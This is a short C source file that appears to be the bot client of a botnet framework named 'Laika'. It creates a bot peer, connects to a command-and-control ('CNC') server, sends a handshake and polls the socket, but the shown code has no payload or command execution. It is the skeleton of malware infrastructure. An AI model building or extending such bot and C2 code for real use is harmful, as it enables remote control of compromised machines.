#include "lmem.h"
#include "lerror.h"
#include "bot.h"

size_t laikaB_pktSizeTbl[LAIKAPKT_MAXNONE] = {
    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t)
};

void laikaB_pktHandler(struct sLaika_peer *peer, uint8_t id, void *uData) {
    printf("got %d packet id!\n", id);
}

struct sLaika_bot *laikaB_newBot(void) {
    struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));

    laikaP_initPList(&bot->pList);
    bot->peer = laikaS_newPeer(
        laikaB_pktHandler,
        laikaB_pktSizeTbl,
        &bot->pList,
        (void*)bot
    );

    return bot;
}

void laikaB_freeBot(struct sLaika_bot *bot) {
    laikaP_cleanPList(&bot->pList);
    laikaS_freePeer(bot->peer);
    laikaM_free(bot);
}

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port) {
    struct sLaika_socket *sock = &bot->peer->sock;

    /* setup socket */
    laikaS_connect(sock, ip, port);
    laikaS_setNonBlock(sock);

    laikaP_addSock(&bot->pList, sock);

    /* queue handshake request */
    laikaS_writeByte(sock, LAIKAPKT_HANDSHAKE_REQ);
    laikaS_write(sock, LAIKA_MAGIC, LAIKA_MAGICLEN);
    laikaS_writeByte(sock, LIB_VERSION_MAJOR);
    laikaS_writeByte(sock, LIB_VERSION_MINOR);

    if (!laikaS_handlePeerOut(bot->peer))
        LAIKA_ERROR("failed to send handshake request!\n")
}

bool laikaB_poll(struct sLaika_bot *bot, int timeout) {
    struct sLaika_pollEvent *evnt;
    int numEvents;

    evnt = laikaP_poll(&bot->pList, timeout, &numEvents);

    if (numEvents == 0) /* no events? timeout was reached */
        return false;

    if (evnt->pollIn && !laikaS_handlePeerIn(bot->peer))
        goto _BKill;

    if (evnt->pollOut && !laikaS_handlePeerOut(bot->peer))
        goto _BKill;

    if (!evnt->pollIn && !evnt->pollOut) {
_BKill:
        laikaS_kill(&bot->peer->sock);
    }

    return true;
}